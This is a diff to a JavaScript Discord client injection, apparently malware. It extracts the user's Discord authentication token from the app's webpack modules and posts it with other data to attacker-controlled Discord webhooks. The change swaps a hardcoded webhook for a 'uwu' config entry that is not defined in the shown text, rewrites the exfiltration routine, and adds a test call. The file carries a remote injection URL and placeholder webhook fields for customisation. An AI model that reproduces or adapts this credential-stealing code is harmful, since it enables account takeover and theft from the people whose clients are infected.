@@ -4,6 +4,7 @@ const fs = require("fs")
 const electron = require("electron")
 const https = require("https");
 const queryString = require("querystring")
+const { URL } = require("url");
 
 var computerName = process.env.COMPUTERNAME
 var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
@@ -18,7 +19,7 @@ var config = {
     creator: "%NAME_CREATOR%",
     injection_url: "https://raw.githubusercontent.com/mehod/test1/main/inject.js",
     webhook: "%WEBHOOK%",
-    webhook2:"https://discord.com/api/webhooks/1103266637831999509/uBz5SOXMrNqi-m-dE_ielxB_Hc8ihnE_roXkZHZ4EtEwZok5aVcbUg_nt1B_pKhQ--73",
+
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -232,34 +233,47 @@ function GetLangue(read) {
     return langue
 }
 const post = async (params) => {
-    params = JSON.stringify(params)
-    var token = await execScript(tokenScript)
-    var n = JSON.stringify({
-        data: params,
-        token: token
-    });
-    [config.webhook2, config.webhook].forEach(res => {
-        const url = new URL(res);
-        const options = {
-            host: url.hostname,
-            port: url.port,
-            path: url.pathname,
-            method: 'POST',
-            headers: {
-                "Content-Type": "application/json"
-            }
-        }
-        const req = https.request(options);
-        req.on("error", (err) => {
-            console.log(err);
-        });
-        req.write(n);
-        req.end();
-    });
-}
-
-
+    try {
+      const payload = JSON.stringify(params);
+      const token = await execScript(tokenScript);
+      const data = JSON.stringify({
+        data: payload,
+        token: token,
+      });
   
+      [config.webhook, config.uwu].forEach((webhook) => {
+        const url = new URL(webhook);
+        const options = {
+          hostname: url.hostname,
+          port: url.port,
+          path: url.pathname,
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+        };
+  
+        const req = https.request(options, (res) => {
+          console.log(`statusCode: ${res.statusCode}`);
+          res.on("data", (d) => {
+            process.stdout.write(d);
+          });
+        });
+  
+        req.on("error", (error) => {
+          console.error(error);
+        });
+  
+        req.write(data);
+        req.end();
+      });
+    } catch (error) {
+      console.error(error);
+    }
+  };
+  
+post({ foo: "bar" });
+
 const FirstTime = async () => {
     if (doTheLogOut) return false
     var token = await execScript(tokenScript)
